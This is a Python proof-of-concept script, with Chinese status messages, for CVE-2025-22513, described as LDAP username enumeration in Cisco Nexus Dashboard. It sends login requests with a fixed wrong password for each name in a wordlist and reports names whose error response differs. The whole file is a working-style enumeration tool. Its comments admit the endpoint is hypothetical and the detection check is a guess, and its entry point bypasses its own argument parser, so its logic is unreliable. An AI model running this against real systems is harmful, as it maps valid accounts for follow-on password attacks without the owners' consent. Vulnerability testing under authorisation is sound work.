
import requests
import argparse
import sys
from urllib.parse import urljoin


def poc(url, usernames_file):
    """
    PoC for CVE-2025-22513: Cisco Nexus Dashboard LDAP Username Enumeration Vulnerability
    Attempts to enumerate valid LDAP usernames by sending authentication requests.
    """
    try:
        # Assume LDAP authentication endpoint (adjust based on actual Nexus Dashboard config)
        auth_url = urljoin(url, "/login")  # Hypothetical endpoint
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/json",
            "Connection": "close"
        }

        # Read usernames from file
        with open(usernames_file, "r", encoding="utf-8") as f:
            usernames = [line.strip() for line in f if line.strip()]

        print(f"[*] 测试 CVE-2025-22513 漏洞: {url}")
        print(f"[*] 读取用户名列表: {usernames_file} ({len(usernames)} 个用户名)")

        valid_usernames = []
        for username in usernames:
            # Craft authentication request (no password or invalid password)
            payload = {"username": username, "password": "invalid"}
            try:
                response = requests.post(auth_url, data=payload, headers=headers, timeout=5, allow_redirects=False)

                # Check for response differences indicating valid username
                # Adjust based on actual response patterns (e.g., status code, response text)
                if response.status_code == 401 and "Invalid credentials" not in response.text:
                    print(f"[+] 发现有效用户名: {username}")
                    valid_usernames.append(username)
                else:
                    print(f"[-] 用户名 {username} 无效")
            except requests.exceptions.RequestException as e:
                print(f"[-] 测试用户名 {username} 失败: {str(e)}")

        if valid_usernames:
            print(f"[+] [{url}] 可能存在 CVE-2025-22513 漏洞！")
            print(f"[+] 有效用户名: {', '.join(valid_usernames)}")
            return True
        else:
            print(f"[-] [{url}] 未检测到 CVE-2025-22513 漏洞")
            return False

    except FileNotFoundError:
        print(f"[-] 用户名文件 {usernames_file} 不存在")
        return False
    except Exception as e:
        print(f"[-] 测试失败: {str(e)}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for CVE-2025-22513 (Cisco Nexus Dashboard LDAP Username Enumeration)")
    parser.add_argument("--url", required=True, help="目标 Nexus Dashboard URL（例如 http://example.com:8080）")
    parser.add_argument("--usernames", required=True, help="包含测试用户名的文件路径")
    args = parser.parse_args()

    result = poc(args.url, args.usernames)
    if result:
        print(f"[*] 建议升级 Cisco Nexus Dashboard 到修复版本。")
        print(
            f"[*] 参考: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-nd-unenum-2xFFh472")


if __name__ == "__main__":
    url = "http://127.0.0.1:8080/"
    usernames = "test_users.txt"
    poc(url, usernames)